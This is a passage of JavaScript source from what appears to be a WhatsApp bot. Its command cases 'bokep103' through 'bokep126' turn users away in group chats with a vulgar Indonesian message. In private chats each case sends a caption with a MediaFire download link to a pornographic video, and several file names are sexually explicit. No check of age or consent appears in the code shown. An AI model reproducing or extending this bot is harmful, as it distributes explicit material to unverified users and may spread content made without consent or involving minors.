			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/5bj2ok1jsodaeg5/1_4900014921128870442.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep103':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/gomcpgdn5fdosww/1_4900014921128870443.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep104':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/pguxhjiut8e9yxe/1_4900014921128870444.mp4/file' })				   
		 break
  //=========================================================  
  //=====================================================================================================================================================================================
  case 'bokep105':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/rdtoq2jek9vq178/1_4900014921128870488.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep106':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/5bepobdlxyqxhri/1_4954217524368507200.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep107':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/46jty67xu4jubth/1_4965355615812583957.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep108':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4vs36ee9swd6mmu/1_4976971496598536441.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep109':				
 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/89bvfbtkvdyzujf/1_4981088136852406618.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep110':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/txzud7cgm3ug911/5_6057902614815703468.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep111':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/x10ll1fgdjwmxjy/5_6066671378961007692.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep112':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/2z6wr33duvwib91/5_6066885856742867530.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep113':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/n5asbncywbc4mpd/5_6080102776782717690.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep114':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/fg8vcvaazmmijz7/5_6082304196630021212.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep115':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/1y1tnynx211gfte/5_6102862572988400409.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep116':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/aa0em8n11kwr42m/5_6109578205327262646.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep117':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/y5w643thgnwzot6/5_6111492163013444474.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep118':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/4272fkwbkuo3qnf/5_6120635641580487299.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep119':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/an8jur5b14nnr6u/masih+perawan.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep120':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/cvhz28koynndrt6/5_6185738601234432420.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep121':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/dnzirpx9rjaezyx/5_6237934329465406056.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep122':
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/6tf11k7v03afoau/5_6239952311259496817.MP4/file' })				   
		 break
  //=========================================================
  case 'bokep123':		
		 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/hk7d7fhzk8p0m0i/5_6291711421705093916.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep124':	
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/kryxh2njtlczliy/COLMEK+3+JARI+NIH+MANTEP+BET+MEMEK.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep125':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 ??𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/35l1tqmi158uv68/DUH+CROT+DIMUKA+🥵🥵.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep126':
			 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/rin6ks9syg89a33/Main+sama+si+doi+.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep127':
